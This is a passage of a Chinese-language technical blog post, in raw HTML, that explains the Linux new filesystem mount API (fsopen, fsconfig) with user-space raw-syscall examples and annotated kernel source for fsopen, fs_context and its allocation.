class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mount(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>], <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, <br>              argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], argv[<span class="hljs-number">3</span>]);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是<a href="https://lwn.net/Articles/753473/">总有些人想搞个大新闻</a>，以 AL Viro 为首的开发者认为旧的 <code>mount</code> 系统调用存在诸多漏洞与设计缺陷，于是决定重写一套新的 mount API，并<a href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">成功被合并到内核主线</a>，称之为 <a href="https://docs.kernel.org/filesystems/mount_api.html">Filesystem Mount API</a></p><p>新的 mount API 将过去的一个简单的 <code>mount</code> 系统调用的功能拆分成了数个新的系统调用，对应不同的文件系统挂载阶段，于是乎现在 Linux 上有着两套并行的 mount API</p><blockquote><p><s>👴的评价是闲着没事干可以去把村口大粪挑一下</s></p></blockquote><h3 id="Step-I-fsopen-获取一个-filesystem-context">Step.I - fsopen: 获取一个 filesystem context</h3><p>还记得笔者以前说过的 <a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#%E4%B8%80%E3%80%81%E2%80%9C%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6%E2%80%9D">Linux 中一切皆文件</a> 的哲学吗，在新的 mount API 中也遵循了这样的哲学——如果说 <code>open()</code> 系统调用用以打开一个文件并提供一个文件描述符，那么 <strong><code>fsopen()</code> 系统调用便用于打开一个文件系统，并提供一个”文件系统描述符“</strong>——称之为 <strong><code>文件系统上下文</code></strong>（filesystem context）</p><p><img src="https://i.loli.net/2021/02/25/iUoHNsaK5vOG9cR.png" alt="wait, it's all FILES"></p><p>由于标准库中还未添加 new mount API 相关的代码，因此我们需要写 raw syscall 来进行相关的系统调用，例如我们可以使用如下代码打开一个空白的 <code>ext4</code> 文件系统上下文（需要 <code>CAP_SYS_ADMIN</code> 权限，或是开启了 unprivileged namespace 的情况下使用 <code>unshare()</code> 系统调用创建带有该权限的 namespace）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是这里创建的是一个<strong>空白的文件系统上下文</strong>，并没有与任何实际设备或文件进行关联——这是我们需要在接下来的步骤中完成的配置</p><h4 id="✳-fsopen-in-kernel"><strong>✳</strong> fsopen() in kernel</h4><blockquote><p>superblock、dentry 这类的 VFS 基础知识不在此处科普，请自行了解：）</p></blockquote><p>在内核当中，<code>fsopen()</code> 系统调用的行为实际上对应创建的是一个 <code>fs_context</code> 结构体作为 filesystem context，创建一个对应的 file 结构体并分配一个文件描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 按名称打开文件系统以便于对其进行设置以挂载</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们被允许指定在哪个容器中打开文件系统，由此指示要使用哪一个命名空间</span><br><span class="hljs-comment"> * (尤其是将哪个网络命名空间用于网络文件系统).</span><br><span class="hljs-comment"> */</span><br>SYSCALL_DEFINE2(fsopen, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, flags)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> *<span class="hljs-title">fs_type</span>;</span><span class="hljs-comment">//文件系统类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><span class="hljs-comment">//文件系统上下文</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">// capabilities 机制，检查对应【命名空间】是否有 CAP_SYS_ADMIN 权限</span><br><span class="hljs-keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))<br><span class="hljs-keyword">return</span> -EPERM;<br><br><span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">// 拷贝用户传入的文件系统名</span><br>fs_name = strndup_user(_fs_name, PAGE_SIZE);<br><span class="hljs-keyword">if</span> (IS_ERR(fs_name))<br><span class="hljs-keyword">return</span> PTR_ERR(fs_name);<br><br><span class="hljs-comment">// 按名称获取文件系统类型</span><br>fs_type = get_fs_type(fs_name);<br>kfree(fs_name);<br><span class="hljs-keyword">if</span> (!fs_type)<br><span class="hljs-keyword">return</span> -ENODEV;<br><br><span class="hljs-comment">// 创建文件系统上下文结构体</span><br>fc = fs_context_for_mount(fs_type, <span class="hljs-number">0</span>);<br>put_filesystem(fs_type);<br><span class="hljs-keyword">if</span> (IS_ERR(fc))<br><span class="hljs-keyword">return</span> PTR_ERR(fc);<br><br>fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;<br><br><span class="hljs-comment">// 分配 Logging buffer</span><br>ret = fscontext_alloc_log(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br><br><span class="hljs-comment">// 创建 file 结构体并分配文件描述符</span><br><span class="hljs-keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="hljs-number">0</span>);<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>fs_context</code> 的具体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 用以保存在创建与重新配置一个 superblock 中的参数的文件系统上下文</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock 的创建会填充到 -&gt;root 中，重新配置需要该字段已经设置.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 参见 Documentation/filesystems/mount_api.txt</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span><span class="hljs-title">uapi_mutex</span>;</span><span class="hljs-comment">/* 用户空间访问的互斥锁 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>*<span class="hljs-title">fs_type</span>;</span><br><span class="hljs-type">void</span>*fs_private;<span class="hljs-comment">/* 文件系统的上下文 */</span><br><span class="hljs-type">void</span>*sget_key;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>*<span class="hljs-title">root</span>;</span><span class="hljs-comment">/* root 与 superblock */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">user_ns</span>;</span><span class="hljs-comment">/* 将要挂载的用户命名空间 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>*<span class="hljs-title">net_ns</span>;</span><span class="hljs-comment">/* 将要挂载的网络1命名空间 */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>*<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* 挂载者的 credentials */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fc_log</span>*<span class="hljs-title">log</span>;</span><span class="hljs-comment">/* Logging buffer */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*source;<span class="hljs-comment">/* 源 (eg. 设备路径) */</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* Linux S&amp;M 设置 */</span><br><span class="hljs-type">void</span>*s_fs_info;<span class="hljs-comment">/* Proposed s_fs_info */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags;<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>sb_flags_mask;<span class="hljs-comment">/* Superblock flags that were changed */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>s_iflags;<span class="hljs-comment">/* OR&#x27;d with sb-&gt;s_iflags */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>lsm_flags;<span class="hljs-comment">/* Information flags from the fs to the LSM */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_purpose</span><span class="hljs-title">purpose</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_context_phase</span><span class="hljs-title">phase</span>:</span><span class="hljs-number">8</span>;<span class="hljs-comment">/* The phase the context is in */</span><br><span class="hljs-type">bool</span>need_free:<span class="hljs-number">1</span>;<span class="hljs-comment">/* 需要调用 ops-&gt;free() */</span><br><span class="hljs-type">bool</span>global:<span class="hljs-number">1</span>;<span class="hljs-comment">/* Goes into &amp;init_user_ns */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>fs_context</code> 的初始化在 <code>alloc_fs_context()</code> 中完成，在 <code>fsopen()</code> 中对应的是 <code>FS_CONTEXT_FOR_MOUNT</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - 创建一个文件系统上下文.</span><br><span class="hljs-comment"> * @fs_type: 文件系统类型.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)//想不出咋翻</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock 标志位 (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: @sb_flags 中可用的成员</span><br><span class="hljs-comment"> * @purpose: 本次配置的目的.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 打开一个文件系统并创建一个挂载上下文（mount context），挂载上下文被以对应的标志位进行初始化，</span><br><span class="hljs-comment"> * 若从另一个 superblock （引自 @reference）进行 submount/automount，</span><br><span class="hljs-comment"> * 则可能由从该 superblock 拷贝来的参数1（如命名空间）.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">      <span class="hljs-keyword">enum</span> fs_context_purpose purpose)</span><br>&#123;<br><span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">int</span> ret = -ENOMEM;<br><br><span class="hljs-comment">// 分配 fs_context 结构体</span><br>fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br><span class="hljs-comment">// 设置对应属性</span><br>fc-&gt;purpose= purpose;<br>fc-&gt;sb_flags= sb_flags;<br>fc-&gt;sb_flags_mask = sb_flags_mask;<br>fc-&gt;fs_type= get_filesystem(fs_type);<br>fc-&gt;cred= get_current_cred();<br>fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);<br><br>mutex_init(&amp;fc-&gt;uapi_mutex);<br><br><span class="hljs-comment">// 由 purpose 设置对应的命名空间</span><br><span class="hljs-keyword">switch</span> (purpose) &#123;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br><span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>fc-&gt;root = dget(reference);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> 让所有的文件系统无条件支持这块 */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br><span class="hljs-comment">// 初始化 fs_context</span><br>ret = init_fs_context(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br>fc-&gt;need_free = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>在完成了通用的初始化工作后，最终进行具体文件系统对应初始化工作的其实是调用 <code>file_system_type</code> 中的 <code>init_fs_context</code> 函数指针对应的函数完成的，这里我们可以看到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化，主要就是为 <code>fs_context-&gt;fs_private</code> 分配一个 <code>legacy_fs_context</code> 结构体，并将 <code>fs_context</code> 的函数表设置为 <code>legacy_fs_context_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>fc-&gt;fs_private = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>fc-&gt;ops = &amp;legacy_fs_context_ops;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>legacy_fs_context</code> 结构体的定义如下，标识了一块指定长度与类型的缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> &#123;</span><br><span class="hljs-type">char</span>*legacy_data;<span class="hljs-comment">/* Data page for legacy filesystems */</span><br><span class="hljs-type">size_t</span>data_size;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">legacy_fs_param</span><span class="hljs-title">param_type</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Step-II-fsconfig-设置-filesystem-context-的相关参数与操作">Step.II - fsconfig: 设置 filesystem context 的相关参数与操作</h3><p>在完成了空白的文件系统上下文的创建之后，我们还需要对其进行相应的配置，以便于后续的挂载操作，这个配置的功能对应到的就是 <code>fsconfig()</code> 系统调用</p><p><code>fsconfig()</code> 系统调用根据不同的 cmd 进行不同的操作，对于挂载文件系统而言其核心操作主要就是两个 cmd：</p><ul><li><code>FSCONFIG_SET_STRING</code> ：设置不同的键值对参数</li><li><code>FSCONFIG_CMD_CREATE</code>：获得一个 superblock 并创建一个 root entry</li></ul><p>示例用法如下所示，这里创建了一个键值对 <code>&quot;source&quot;=/dev/sdb1</code> 表示文件系统源所在的设备名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="✳-fsconfig-in-kernel">✳ fsconfig() in kernel</h4><p>内核空间中的 <code>fsconfig()</code> 实现比较长，但主要就是根据 cmd 进行各种 switch，这里就不贴完整的源码了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, 